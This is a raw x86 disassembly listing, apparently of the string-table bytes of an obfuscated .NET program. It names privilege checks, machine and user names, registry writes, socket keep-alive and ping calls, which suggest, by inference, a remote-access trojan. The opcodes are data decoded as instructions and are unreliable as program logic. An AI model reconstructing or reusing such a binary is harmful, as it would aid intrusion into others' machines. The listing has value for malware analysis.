  4085ea:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  4085f1:	64 6c                	fs insb (%dx),%es:(%edi)
  4085f3:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4085f7:	74 4d                	je     0x408646
  4085f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4085fa:	64 75 6c             	fs jne 0x408669
  4085fd:	65 48                	gs dec %eax
  4085ff:	61                   	popa
  408600:	6e                   	outsb  %ds:(%esi),(%dx)
  408601:	64 6c                	fs insb (%dx),%es:(%edi)
  408603:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408607:	6e                   	outsb  %ds:(%esi),(%dx)
  408608:	74 69                	je     0x408673
  40860a:	6d                   	insl   (%dx),%es:(%edi)
  40860b:	65 54                	gs push %esp
  40860d:	79 70                	jns    0x40867f
  40860f:	65 48                	gs dec %eax
  408611:	61                   	popa
  408612:	6e                   	outsb  %ds:(%esi),(%dx)
  408613:	64 6c                	fs insb (%dx),%es:(%edi)
  408615:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408619:	74 54                	je     0x40866f
  40861b:	79 70                	jns    0x40868d
  40861d:	65 46                	gs inc %esi
  40861f:	72 6f                	jb     0x408690
  408621:	6d                   	insl   (%dx),%es:(%edi)
  408622:	48                   	dec    %eax
  408623:	61                   	popa
  408624:	6e                   	outsb  %ds:(%esi),(%dx)
  408625:	64 6c                	fs insb (%dx),%es:(%edi)
  408627:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  40862b:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408632:	65 
  408633:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  408637:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  40863e:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  408645:	6e 
  408646:	52                   	push   %edx
  408647:	6f                   	outsl  %ds:(%esi),(%dx)
  408648:	6c                   	insb   (%dx),%es:(%edi)
  408649:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  40864d:	6e                   	outsb  %ds:(%esi),(%dx)
  40864e:	64 6f                	outsl  %fs:(%esi),(%dx)
  408650:	77 73                	ja     0x4086c5
  408652:	42                   	inc    %edx
  408653:	75 69                	jne    0x4086be
  408655:	6c                   	insb   (%dx),%es:(%edi)
  408656:	74 49                	je     0x4086a1
  408658:	6e                   	outsb  %ds:(%esi),(%dx)
  408659:	52                   	push   %edx
  40865a:	6f                   	outsl  %ds:(%esi),(%dx)
  40865b:	6c                   	insb   (%dx),%es:(%edi)
  40865c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408660:	74 5f                	je     0x4086c1
  408662:	4d                   	dec    %ebp
  408663:	61                   	popa
  408664:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  40866b:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40866f:	6f                   	outsl  %ds:(%esi),(%dx)
  408670:	63 65 73             	arpl   %esp,0x73(%ebp)
  408673:	73 4d                	jae    0x4086c2
  408675:	6f                   	outsl  %ds:(%esi),(%dx)
  408676:	64 75 6c             	fs jne 0x4086e5
  408679:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40867d:	74 5f                	je     0x4086de
  40867f:	57                   	push   %edi
  408680:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408687:	79 6c                	jns    0x4086f5
  408689:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40868d:	6f                   	outsl  %ds:(%esi),(%dx)
  40868e:	63 65 73             	arpl   %esp,0x73(%ebp)
  408691:	73 57                	jae    0x4086ea
  408693:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40869a:	79 6c                	jns    0x408708
  40869c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086a0:	74 5f                	je     0x408701
  4086a2:	4e                   	dec    %esi
  4086a3:	61                   	popa
  4086a4:	6d                   	insl   (%dx),%es:(%edi)
  4086a5:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086a9:	74 5f                	je     0x40870a
  4086ab:	46                   	inc    %esi
  4086ac:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086b3:	00 
  4086b4:	73 65                	jae    0x40871b
  4086b6:	74 5f                	je     0x408717
  4086b8:	46                   	inc    %esi
  4086b9:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086c0:	00 
  4086c1:	47                   	inc    %edi
  4086c2:	65 74 54             	gs je  0x408719
  4086c5:	65 6d                	gs insl (%dx),%es:(%edi)
  4086c7:	70 46                	jo     0x40870f
  4086c9:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086d0:	00 
  4086d1:	47                   	inc    %edi
  4086d2:	65 74 46             	gs je  0x40871b
  4086d5:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086dc:	00 
  4086dd:	67 65 74 5f          	addr16 gs je 0x408740
  4086e1:	4d                   	dec    %ebp
  4086e2:	61                   	popa
  4086e3:	63 68 69             	arpl   %ebp,0x69(%eax)
  4086e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e7:	65 4e                	gs dec %esi
  4086e9:	61                   	popa
  4086ea:	6d                   	insl   (%dx),%es:(%edi)
  4086eb:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086ef:	74 5f                	je     0x408750
  4086f1:	4f                   	dec    %edi
  4086f2:	53                   	push   %ebx
  4086f3:	46                   	inc    %esi
  4086f4:	75 6c                	jne    0x408762
  4086f6:	6c                   	insb   (%dx),%es:(%edi)
  4086f7:	4e                   	dec    %esi
  4086f8:	61                   	popa
  4086f9:	6d                   	insl   (%dx),%es:(%edi)
  4086fa:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086fe:	74 5f                	je     0x40875f
  408700:	46                   	inc    %esi
  408701:	75 6c                	jne    0x40876f
  408703:	6c                   	insb   (%dx),%es:(%edi)
  408704:	4e                   	dec    %esi
  408705:	61                   	popa
  408706:	6d                   	insl   (%dx),%es:(%edi)
  408707:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40870b:	74 5f                	je     0x40876c
  40870d:	55                   	push   %ebp
  40870e:	73 65                	jae    0x408775
  408710:	72 4e                	jb     0x408760
  408712:	61                   	popa
  408713:	6d                   	insl   (%dx),%es:(%edi)
  408714:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  408718:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  40871c:	6f                   	outsl  %ds:(%esi),(%dx)
  40871d:	73 74                	jae    0x408793
  40871f:	4e                   	dec    %esi
  408720:	61                   	popa
  408721:	6d                   	insl   (%dx),%es:(%edi)
  408722:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  408727:	65 54                	gs push %esp
  408729:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  408730:	5f                   	pop    %edi
  408731:	4c                   	dec    %esp
  408732:	61                   	popa
  408733:	73 74                	jae    0x4087a9
  408735:	57                   	push   %edi
  408736:	72 69                	jb     0x4087a1
  408738:	74 65                	je     0x40879f
  40873a:	54                   	push   %esp
  40873b:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  408742:	6e                   	outsb  %ds:(%esi),(%dx)
  408743:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  40874a:	54                   	push   %esp
  40874b:	69 6d 65 00 62 49 67 	imul   $0x67496200,0x65(%ebp),%ebp
  408752:	64 6a 58             	fs push $0x58
  408755:	6a 47                	push   $0x47
  408757:	65 64 6e             	gs outsb %fs:(%esi),(%dx)
  40875a:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  40875e:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
  408765:	00 
  408766:	43                   	inc    %ebx
  408767:	6f                   	outsl  %ds:(%esi),(%dx)
  408768:	6d                   	insl   (%dx),%es:(%edi)
  408769:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40876c:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  408770:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408777:	6d                   	insl   (%dx),%es:(%edi)
  408778:	65 54                	gs push %esp
  40877a:	79 70                	jns    0x4087ec
  40877c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408780:	74 5f                	je     0x4087e1
  408782:	56                   	push   %esi
  408783:	61                   	popa
  408784:	6c                   	insb   (%dx),%es:(%edi)
  408785:	75 65                	jne    0x4087ec
  408787:	54                   	push   %esp
  408788:	79 70                	jns    0x4087fa
  40878a:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40878e:	6f                   	outsl  %ds:(%esi),(%dx)
  40878f:	74 6f                	je     0x408800
  408791:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408794:	54                   	push   %esp
  408795:	79 70                	jns    0x408807
  408797:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40879b:	74 54                	je     0x4087f1
  40879d:	79 70                	jns    0x40880f
  40879f:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  4087a3:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4087a6:	74 54                	je     0x4087fc
  4087a8:	79 70                	jns    0x40881a
  4087aa:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4087ae:	6c                   	insb   (%dx),%es:(%edi)
  4087af:	65 53                	gs push %ebx
  4087b1:	68 61 72 65 00       	push   $0x657261
  4087b6:	53                   	push   %ebx
  4087b7:	79 73                	jns    0x40882c
  4087b9:	74 65                	je     0x408820
  4087bb:	6d                   	insl   (%dx),%es:(%edi)
  4087bc:	2e 43                	cs inc %ebx
  4087be:	6f                   	outsl  %ds:(%esi),(%dx)
  4087bf:	72 65                	jb     0x408826
  4087c1:	00 43 6c             	add    %al,0x6c(%ebx)
  4087c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4087c5:	73 65                	jae    0x40882c
  4087c7:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4087cb:	70 6f                	jo     0x40883c
  4087cd:	73 65                	jae    0x408834
  4087cf:	00 63 58             	add    %ah,0x58(%ebx)
  4087d2:	4a                   	dec    %edx
  4087d3:	65 49                	gs dec %ecx
  4087d5:	71 55                	jno    0x40882c
  4087d7:	6c                   	insb   (%dx),%es:(%edi)
  4087d8:	7a 6f                	jp     0x408849
  4087da:	73 65                	jae    0x408841
  4087dc:	00 50 61             	add    %dl,0x61(%eax)
  4087df:	72 73                	jb     0x408854
  4087e1:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4087e5:	72 52                	jb     0x408839
  4087e7:	65 76 65             	gs jbe 0x40884f
  4087ea:	72 73                	jb     0x40885f
  4087ec:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4087f0:	30 39                	xor    %bh,(%ecx)
  4087f2:	43                   	inc    %ebx
  4087f3:	65 72 74             	gs jb  0x40886a
  4087f6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4087fd:	00 43 72             	add    %al,0x72(%ebx)
  408800:	65 61                	gs popa
  408802:	74 65                	je     0x408869
  408804:	00 53 65             	add    %dl,0x65(%ebx)
  408807:	74 54                	je     0x40885d
  408809:	68 72 65 61 64       	push   $0x64616572
  40880e:	45                   	inc    %ebp
  40880f:	78 65                	js     0x408876
  408811:	63 75 74             	arpl   %esi,0x74(%ebp)
  408814:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40881b:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  408820:	65 74 65             	gs je  0x408888
  408823:	00 43 61             	add    %al,0x61(%ebx)
  408826:	6c                   	insb   (%dx),%es:(%edi)
  408827:	6c                   	insb   (%dx),%es:(%edi)
  408828:	53                   	push   %ebx
  408829:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408830:	74 
  408831:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408835:	6d                   	insl   (%dx),%es:(%edi)
  408836:	70 69                	jo     0x4088a1
  408838:	6c                   	insb   (%dx),%es:(%edi)
  408839:	65 72 47             	gs jb  0x408883
  40883c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40883e:	65 72 61             	gs jb  0x4088a2
  408841:	74 65                	je     0x4088a8
  408843:	64 41                	fs inc %ecx
  408845:	74 74                	je     0x4088bb
  408847:	72 69                	jb     0x4088b2
  408849:	62 75 74             	bound  %esi,0x74(%ebp)
  40884c:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408851:	75 67                	jne    0x4088ba
  408853:	67 61                	addr16 popa
  408855:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408859:	74 74                	je     0x4088cf
  40885b:	72 69                	jb     0x4088c6
  40885d:	62 75 74             	bound  %esi,0x74(%ebp)
  408860:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408864:	6d                   	insl   (%dx),%es:(%edi)
  408865:	56                   	push   %esi
  408866:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40886d:	74 74                	je     0x4088e3
  40886f:	72 69                	jb     0x4088da
  408871:	62 75 74             	bound  %esi,0x74(%ebp)
  408874:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408878:	73 65                	jae    0x4088df
  40887a:	6d                   	insl   (%dx),%es:(%edi)
  40887b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40887f:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408886:	72 
  408887:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40888e:	73 73                	jae    0x408903
  408890:	65 6d                	gs insl (%dx),%es:(%edi)
  408892:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408896:	72 61                	jb     0x4088f9
  408898:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40889b:	61                   	popa
  40889c:	72 6b                	jb     0x408909
  40889e:	41                   	inc    %ecx
  40889f:	74 74                	je     0x408915
  4088a1:	72 69                	jb     0x40890c
  4088a3:	62 75 74             	bound  %esi,0x74(%ebp)
  4088a6:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4088ab:	67 65 74 46          	addr16 gs je 0x4088f5
  4088af:	72 61                	jb     0x408912
  4088b1:	6d                   	insl   (%dx),%es:(%edi)
  4088b2:	65 77 6f             	gs ja  0x408924
  4088b5:	72 6b                	jb     0x408922
  4088b7:	41                   	inc    %ecx
  4088b8:	74 74                	je     0x40892e
  4088ba:	72 69                	jb     0x408925
  4088bc:	62 75 74             	bound  %esi,0x74(%ebp)
  4088bf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088c3:	73 65                	jae    0x40892a
  4088c5:	6d                   	insl   (%dx),%es:(%edi)
  4088c6:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4088ca:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4088d1:	69 
  4088d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4088d4:	41                   	inc    %ecx
  4088d5:	74 74                	je     0x40894b
  4088d7:	72 69                	jb     0x408942
  4088d9:	62 75 74             	bound  %esi,0x74(%ebp)
  4088dc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088e0:	73 65                	jae    0x408947
  4088e2:	6d                   	insl   (%dx),%es:(%edi)
  4088e3:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4088e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e9:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4088ef:	74 69                	je     0x40895a
  4088f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4088f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4088f3:	41                   	inc    %ecx
  4088f4:	74 74                	je     0x40896a
  4088f6:	72 69                	jb     0x408961
  4088f8:	62 75 74             	bound  %esi,0x74(%ebp)
  4088fb:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088ff:	73 65                	jae    0x408966
  408901:	6d                   	insl   (%dx),%es:(%edi)
  408902:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  408906:	65 73 63             	gs jae 0x40896c
  408909:	72 69                	jb     0x408974
  40890b:	70 74                	jo     0x408981
  40890d:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408914:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  40891b:	65 66 61             	gs popaw
  40891e:	75 6c                	jne    0x40898c
  408920:	74 4d                	je     0x40896f
  408922:	65 6d                	gs insl (%dx),%es:(%edi)
  408924:	62 65 72             	bound  %esp,0x72(%ebp)
  408927:	41                   	inc    %ecx
  408928:	74 74                	je     0x40899e
  40892a:	72 69                	jb     0x408995
  40892c:	62 75 74             	bound  %esi,0x74(%ebp)
  40892f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408933:	6d                   	insl   (%dx),%es:(%edi)
  408934:	70 69                	jo     0x40899f
  408936:	6c                   	insb   (%dx),%es:(%edi)
  408937:	61                   	popa
  408938:	74 69                	je     0x4089a3
  40893a:	6f                   	outsl  %ds:(%esi),(%dx)
  40893b:	6e                   	outsb  %ds:(%esi),(%dx)
  40893c:	52                   	push   %edx
  40893d:	65 6c                	gs insb (%dx),%es:(%edi)
  40893f:	61                   	popa
  408940:	78 61                	js     0x4089a3
  408942:	74 69                	je     0x4089ad
  408944:	6f                   	outsl  %ds:(%esi),(%dx)
  408945:	6e                   	outsb  %ds:(%esi),(%dx)
  408946:	73 41                	jae    0x408989
  408948:	74 74                	je     0x4089be
  40894a:	72 69                	jb     0x4089b5
  40894c:	62 75 74             	bound  %esi,0x74(%ebp)
  40894f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408953:	73 65                	jae    0x4089ba
  408955:	6d                   	insl   (%dx),%es:(%edi)
  408956:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40895a:	72 6f                	jb     0x4089cb
  40895c:	64 75 63             	fs jne 0x4089c2
  40895f:	74 41                	je     0x4089a2
  408961:	74 74                	je     0x4089d7
  408963:	72 69                	jb     0x4089ce
  408965:	62 75 74             	bound  %esi,0x74(%ebp)
  408968:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40896c:	73 65                	jae    0x4089d3
  40896e:	6d                   	insl   (%dx),%es:(%edi)
  40896f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408973:	6f                   	outsl  %ds:(%esi),(%dx)
  408974:	70 79                	jo     0x4089ef
  408976:	72 69                	jb     0x4089e1
  408978:	67 68 74 41 74 74    	addr16 push $0x74744174
  40897e:	72 69                	jb     0x4089e9
  408980:	62 75 74             	bound  %esi,0x74(%ebp)
  408983:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408987:	73 65                	jae    0x4089ee
  408989:	6d                   	insl   (%dx),%es:(%edi)
  40898a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40898e:	6f                   	outsl  %ds:(%esi),(%dx)
  40898f:	6d                   	insl   (%dx),%es:(%edi)
  408990:	70 61                	jo     0x4089f3
  408992:	6e                   	outsb  %ds:(%esi),(%dx)
  408993:	79 41                	jns    0x4089d6
  408995:	74 74                	je     0x408a0b
  408997:	72 69                	jb     0x408a02
  408999:	62 75 74             	bound  %esi,0x74(%ebp)
  40899c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4089a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a1:	74 69                	je     0x408a0c
  4089a3:	6d                   	insl   (%dx),%es:(%edi)
  4089a4:	65 43                	gs inc %ebx
  4089a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4089a7:	6d                   	insl   (%dx),%es:(%edi)
  4089a8:	70 61                	jo     0x408a0b
  4089aa:	74 69                	je     0x408a15
  4089ac:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4089af:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4089b6:	69 
  4089b7:	62 75 74             	bound  %esi,0x74(%ebp)
  4089ba:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4089be:	74 5f                	je     0x408a1f
  4089c0:	55                   	push   %ebp
  4089c1:	73 65                	jae    0x408a28
  4089c3:	53                   	push   %ebx
  4089c4:	68 65 6c 6c 45       	push   $0x456c6c65
  4089c9:	78 65                	js     0x408a30
  4089cb:	63 75 74             	arpl   %esi,0x74(%ebp)
  4089ce:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4089d2:	61                   	popa
  4089d3:	64 42                	fs inc %edx
  4089d5:	79 74                	jns    0x408a4b
  4089d7:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4089db:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4089e2:	00 
  4089e3:	44                   	inc    %esp
  4089e4:	65 6c                	gs insb (%dx),%es:(%edi)
  4089e6:	65 74 65             	gs je  0x408a4e
  4089e9:	56                   	push   %esi
  4089ea:	61                   	popa
  4089eb:	6c                   	insb   (%dx),%es:(%edi)
  4089ec:	75 65                	jne    0x408a53
  4089ee:	00 47 65             	add    %al,0x65(%edi)
  4089f1:	74 56                	je     0x408a49
  4089f3:	61                   	popa
  4089f4:	6c                   	insb   (%dx),%es:(%edi)
  4089f5:	75 65                	jne    0x408a5c
  4089f7:	00 53 65             	add    %dl,0x65(%ebx)
  4089fa:	74 56                	je     0x408a52
  4089fc:	61                   	popa
  4089fd:	6c                   	insb   (%dx),%es:(%edi)
  4089fe:	75 65                	jne    0x408a65
  408a00:	00 67 65             	add    %ah,0x65(%edi)
  408a03:	74 5f                	je     0x408a64
  408a05:	4b                   	dec    %ebx
  408a06:	65 65 70 41          	gs gs jo 0x408a4b
  408a0a:	6c                   	insb   (%dx),%es:(%edi)
  408a0b:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408a12:	5f                   	pop    %edi
  408a13:	4b                   	dec    %ebx
  408a14:	65 65 70 41          	gs gs jo 0x408a59
  408a18:	6c                   	insb   (%dx),%es:(%edi)
  408a19:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408a20:	6f                   	outsl  %ds:(%esi),(%dx)
  408a21:	76 65                	jbe    0x408a88
  408a23:	00 73 65             	add    %dh,0x65(%ebx)
  408a26:	74 5f                	je     0x408a87
  408a28:	42                   	inc    %edx
  408a29:	6c                   	insb   (%dx),%es:(%edi)
  408a2a:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2b:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408a2e:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a35:	5f                   	pop    %edi
  408a36:	54                   	push   %esp
  408a37:	6f                   	outsl  %ds:(%esi),(%dx)
  408a38:	74 61                	je     0x408a9b
  408a3a:	6c                   	insb   (%dx),%es:(%edi)
  408a3b:	53                   	push   %ebx
  408a3c:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a43:	5f                   	pop    %edi
  408a44:	48                   	dec    %eax
  408a45:	65 61                	gs popa
  408a47:	64 65 72 53          	fs gs jb 0x408a9e
  408a4b:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a52:	5f                   	pop    %edi
  408a53:	48                   	dec    %eax
  408a54:	65 61                	gs popa
  408a56:	64 65 72 53          	fs gs jb 0x408aad
  408a5a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a61:	5f                   	pop    %edi
  408a62:	53                   	push   %ebx
  408a63:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a65:	64 42                	fs inc %edx
  408a67:	75 66                	jne    0x408acf
  408a69:	66 65 72 53          	data16 gs jb 0x408ac0
  408a6d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a74:	5f                   	pop    %edi
  408a75:	52                   	push   %edx
  408a76:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408a7a:	76 65                	jbe    0x408ae1
  408a7c:	42                   	inc    %edx
  408a7d:	75 66                	jne    0x408ae5
  408a7f:	66 65 72 53          	data16 gs jb 0x408ad6
  408a83:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a8a:	5f                   	pop    %edi
  408a8b:	4b                   	dec    %ebx
  408a8c:	65 79 53             	gs jns 0x408ae2
  408a8f:	69 7a 65 00 51 61 70 	imul   $0x70615100,0x65(%edx),%edi
  408a96:	6b 44 55 57 4f       	imul   $0x4f,0x57(%ebp,%edx,2),%eax
  408a9b:	71 6d                	jno    0x408b0a
  408a9d:	4b                   	dec    %ebx
  408a9e:	4e                   	dec    %esi
  408a9f:	66 00 4e 56          	data16 add %cl,0x56(%esi)
  408aa3:	69 56 58 45 6a 4c 45 	imul   $0x454c6a45,0x58(%esi),%edx
  408aaa:	4f                   	dec    %edi
  408aab:	66 00 61 68          	data16 add %ah,0x68(%ecx)
  408aaf:	5a                   	pop    %edx
  408ab0:	64 54                	fs push %esp
  408ab2:	49                   	dec    %ecx
  408ab3:	61                   	popa
  408ab4:	69 76 49 5a 66 00 61 	imul   $0x6100665a,0x49(%esi),%esi
  408abb:	63 75 42             	arpl   %esi,0x42(%ebp)
  408abe:	6b 47 42 41          	imul   $0x41,0x42(%edi),%eax
  408ac2:	59                   	pop    %ecx
  408ac3:	68 70 6c 66 00       	push   $0x666c70
  408ac8:	78 63                	js     0x408b2d
  408aca:	44                   	inc    %esp
  408acb:	55                   	push   %ebp
  408acc:	52                   	push   %edx
  408acd:	4b                   	dec    %ebx
  408ace:	43                   	inc    %ebx
  408acf:	6c                   	insb   (%dx),%es:(%edi)
  408ad0:	4a                   	dec    %edx
  408ad1:	4a                   	dec    %edx
  408ad2:	70 7a                	jo     0x408b4e
  408ad4:	70 66                	jo     0x408b3c
  408ad6:	00 66 46             	add    %ah,0x46(%esi)
  408ad9:	73 48                	jae    0x408b23
  408adb:	79 4e                	jns    0x408b2b
  408add:	43                   	inc    %ebx
  408ade:	66 48                	dec    %ax
  408ae0:	4d                   	dec    %ebp
  408ae1:	43                   	inc    %ebx
  408ae2:	67 00 4e 41          	add    %cl,0x41(%bp)
  408ae6:	62 74 77 61          	bound  %esi,0x61(%edi,%esi,2)
  408aea:	54                   	push   %esp
  408aeb:	76 48                	jbe    0x408b35
  408aed:	67 00 5a 66          	add    %bl,0x66(%bp,%si)
  408af1:	41                   	inc    %ecx
  408af2:	51                   	push   %ecx
  408af3:	47                   	inc    %edi
  408af4:	61                   	popa
  408af5:	4a                   	dec    %edx
  408af6:	59                   	pop    %ecx
  408af7:	79 51                	jns    0x408b4a
  408af9:	51                   	push   %ecx
  408afa:	4f                   	dec    %edi
  408afb:	67 00 6d 5a          	add    %ch,0x5a(%di)
  408aff:	46                   	inc    %esi
  408b00:	74 53                	je     0x408b55
  408b02:	6a 7a                	push   $0x7a
  408b04:	66 64 61             	fs popaw
  408b07:	65 6b 64 65 67 00    	imul   $0x0,%gs:0x67(%ebp,%eiz,2),%esp
  408b0d:	43                   	inc    %ebx
  408b0e:	72 79                	jb     0x408b89
  408b10:	70 74                	jo     0x408b86
  408b12:	6f                   	outsl  %ds:(%esi),(%dx)
  408b13:	43                   	inc    %ebx
  408b14:	6f                   	outsl  %ds:(%esi),(%dx)
  408b15:	6e                   	outsb  %ds:(%esi),(%dx)
  408b16:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  408b1c:	74 5f                	je     0x408b7d
  408b1e:	50                   	push   %eax
  408b1f:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408b26:	5f                   	pop    %edi
  408b27:	50                   	push   %eax
  408b28:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408b2f:	74 65                	je     0x408b96
  408b31:	6d                   	insl   (%dx),%es:(%edi)
  408b32:	2e 54                	cs push %esp
  408b34:	68 72 65 61 64       	push   $0x64616572
  408b39:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408b40:	5f                   	pop    %edi
  408b41:	50                   	push   %eax
  408b42:	61                   	popa
  408b43:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408b4a:	64 64 
  408b4c:	5f                   	pop    %edi
  408b4d:	53                   	push   %ebx
  408b4e:	65 73 73             	gs jae 0x408bc4
  408b51:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408b58:	6e                   	outsb  %ds:(%esi),(%dx)
  408b59:	67 00 55 54          	add    %dl,0x54(%di)
  408b5d:	46                   	inc    %esi
  408b5e:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408b61:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408b64:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408b6b:	74 65                	je     0x408bd2
